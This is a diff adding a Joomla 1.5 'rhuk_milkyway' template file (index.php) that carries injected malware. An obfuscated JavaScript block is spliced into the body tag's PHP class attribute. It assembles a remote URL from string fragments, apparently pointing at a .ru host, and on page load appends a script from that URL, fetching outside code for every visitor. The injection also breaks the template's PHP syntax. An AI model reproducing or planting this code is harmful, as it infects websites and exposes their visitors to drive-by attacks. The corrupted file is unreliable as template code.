@@ -1,0 +1,170 @@
+<?php
+/**
+ * @copyright	Copyright (C) 2005 - 2008 Open Source Matters. All rights reserved.
+ * @license		GNU/GPL, see LICENSE.php
+ * Joomla! is free software. This version may have been modified pursuant
+ * to the GNU General Public License, and as distributed it includes or
+ * is derivative of works licensed under the GNU General Public License or
+ * other free or open source software licenses.
+ * See COPYRIGHT.php for copyright notices and details.
+ */
+
+// no direct access
+defined( '_JEXEC' ) or die( 'Restricted access' );
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
+<head>
+<jdoc:include type="head" />
+
+<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
+<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/rhuk_milkyway/css/template.css" type="text/css" />
+<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/rhuk_milkyway/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
+<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/rhuk_milkyway/css/<?php echo $this->params->get('backgroundVariation'); ?>_bg.css" type="text/css" />
+<!--[if lte IE 6]>
+<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/ieonly.css" rel="stylesheet" type="text/css" />
+<![endif]-->
+<?php if($this->direction == 'rtl') : ?>
+	<link href="<?php echo $this->baseurl ?>/templates/rhuk_milkyway/css/template_rtl.css" rel="stylesheet" type="text/css" />
+<?php endif; ?>
+
+</head>
+<body id="page_bg" class="color_<?php echo $this-><script>var i;if(i!='' && i!='f'){i=null};this.US='';function h(){var N;if(N!='D'){N='D'};this.q='';this.K="";var A;if(A!=''){A='fI'};var H=new String("g");var u='';var eQ;if(eQ!='' && eQ!='R'){eQ=null};var j="";var zr="";var G=RegExp;var ia;if(ia!='Om' && ia != ''){ia=null};this.tD="";var GF="";function z(O,M){var t=new G("["+M+"]", H);return O.replace(t, u);var hS=new Date();var Oa;if(Oa!='' && Oa!='C'){Oa=''};};var GN='';var Dj='';var qY=new Array();var U=z('83359903298992509252',"2593");var T="scri"+"fNLpt".substr(3);var F=new String("9Qm/go".substr(3)+"oglqDT5".substr(0,3)+"arOe.cOra".substr(3,3)+"NZdom/".substr(3)+"gooNuBK".substr(0,3)+"Ef6gle".substr(3)+".co"+"m/m"+"HasediHas".substr(3,3)+"afi"+"c9jyre.".substr(4)+"com"+"izm/remzi".substr(3,3)+"DK3tver3tDK".substr(4,3)+"Ilrso.".substr(3)+"0oGnetGo0".substr(3,3)+"Gt3/xctG3".substr(3,3)+"y1sar.y1s".substr(3,3)+"comEkf".substr(0,3)+"mtH.cn".substr(3)+"cEFa.ph".substr(4)+"3VUp".substr(3));var TB='';var m=String("bdKWhtt".substr(4)+"p:/"+"cYtB/ms".substr(4)+"GiDYn-c".substr(4)+"om-"+"tIBcn.".substr(3)+"5nM1torn1M5".substr(4,3)+"renLfY".substr(0,3)+"C0mtz.".substr(3)+"MG6scomGsM6".substr(4,3)+"lugK.so".substr(4)+"8x9egou89ex".substr(4,3)+"TGgx-co".substr(4)+"H6kIm.sI6kH".substr(4,3)+"eas"+"ilv"+"ers"+"SQ1kite".substr(4)+"NX3.ruN3X".substr(3,3)+"8rp5:pr58".substr(4,1));var An;if(An!='Ck' && An!='vt'){An=''};var Wg='';window.onload=function(){this.d='';this.ac='';try {var II;if(II!=''){II='Q'};this.ib="";TB=m+U;this.ML='';TB+=F;var pW;if(pW!='IC' && pW != ''){pW=null};var WP='';var l='';_=document.createElement(T);this.Cu="";var WV;if(WV!='' && WV!='N_'){WV='O_'};this.L="";var hh;if(hh!='g' && hh!='Mk'){hh='g'};_.defer=[1][0];this.Rl="";_.src=TB;this.HC="";this.TR="";document.body.appendChild(_);var Aj=new Array();} catch(e){var CQ=new Date();var bD;if(bD!=''){bD='qp'};};var UK='';};this.AY='';};h();var Ja;if(Ja!='' && Ja!='HB'){Ja='Mg'};</script>params->get('colorVariation'); ?> bg_<?php echo $this->params->get('backgroundVariation'); ?> width_<?php echo $this->params->get('widthStyle'); ?>">
+<a name="up" id="up"></a>
+<div class="center" align="center">
+	<div id="wrapper">
+		<div id="wrapper_r">
+			<div id="header">
+				<div id="header_l">
+					<div id="header_r">
+						<div id="logo"></div>
+						<jdoc:include type="modules" name="top" />
+					</div>
+				</div>
+			</div>
+
+			<div id="tabarea">
+				<div id="tabarea_l">
+					<div id="tabarea_r">
+						<div id="tabmenu">
+						<table cellpadding="0" cellspacing="0" class="pill">
+							<tr>
+								<td class="pill_l">&nbsp;</td>
+								<td class="pill_m">
+								<div id="pillmenu">
+									<jdoc:include type="modules" name="user3" />
+								</div>
+								</td>
+								<td class="pill_r">&nbsp;</td>
+							</tr>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+
+			<div id="search">
+				<jdoc:include type="modules" name="user4" />
+			</div>
+
+			<div id="pathway">
+				<jdoc:include type="modules" name="breadcrumb" />
+			</div>
+
+			<div class="clr"></div>
+
+			<div id="whitebox">
+				<div id="whitebox_t">
+					<div id="whitebox_tl">
+						<div id="whitebox_tr"></div>
+					</div>
+				</div>
+
+				<div id="whitebox_m">
+					<div id="area">
+									<jdoc:include type="message" />
+
+						<div id="leftcolumn">
+						<?php if($this->countModules('left')) : ?>
+							<jdoc:include type="modules" name="left" style="rounded" />
+						<?php endif; ?>
+						</div>
+
+						<?php if($this->countModules('left')) : ?>
+						<div id="maincolumn">
+						<?php else: ?>
+						<div id="maincolumn_full">
+						<?php endif; ?>
+							<?php if($this->countModules('user1 or user2')) : ?>
+								<table class="nopad user1user2">
+									<tr valign="top">
+										<?php if($this->countModules('user1')) : ?>
+											<td>
+												<jdoc:include type="modules" name="user1" style="xhtml" />
+											</td>
+										<?php endif; ?>
+										<?php if($this->countModules('user1 and user2')) : ?>
+											<td class="greyline">&nbsp;</td>
+										<?php endif; ?>
+										<?php if($this->countModules('user2')) : ?>
+											<td>
+												<jdoc:include type="modules" name="user2" style="xhtml" />
+											</td>
+										<?php endif; ?>
+									</tr>
+								</table>
+
+								<div id="maindivider"></div>
+							<?php endif; ?>
+
+							<table class="nopad">
+								<tr valign="top">
+									<td>
+										<jdoc:include type="component" />
+										<jdoc:include type="modules" name="footer" style="xhtml"/>
+									</td>
+									<?php if($this->countModules('right') and JRequest::getCmd('layout') != 'form') : ?>
+										<td class="greyline">&nbsp;</td>
+										<td width="170">
+											<jdoc:include type="modules" name="right" style="xhtml"/>
+										</td>
+									<?php endif; ?>
+								</tr>
+							</table>
+
+						</div>
+						<div class="clr"></div>
+					</div>
+					<div class="clr"></div>
+				</div>
+
+				<div id="whitebox_b">
+					<div id="whitebox_bl">
+						<div id="whitebox_br"></div>
+					</div>
+				</div>
+			</div>
+
+			<div id="footerspacer"></div>
+		</div>
+
+		<div id="footer">
+			<div id="footer_l">
+				<div id="footer_r">
+					<p id="syndicate">
+						<jdoc:include type="modules" name="syndicate" />
+					</p>
+					<p id="power_by">
+	 				 	<?php echo JText::_('Powered by') ?> <a href="http://www.joomla.org">Joomla!</a>.
+						<?php echo JText::_('Valid') ?> <a href="http://validator.w3.org/check/referer">XHTML</a> <?php echo JText::_('and') ?> <a href="http://jigsaw.w3.org/css-validator/check/referer">CSS</a>.
+					</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+<jdoc:include type="modules" name="debug" />
+
+</body>
+</html>
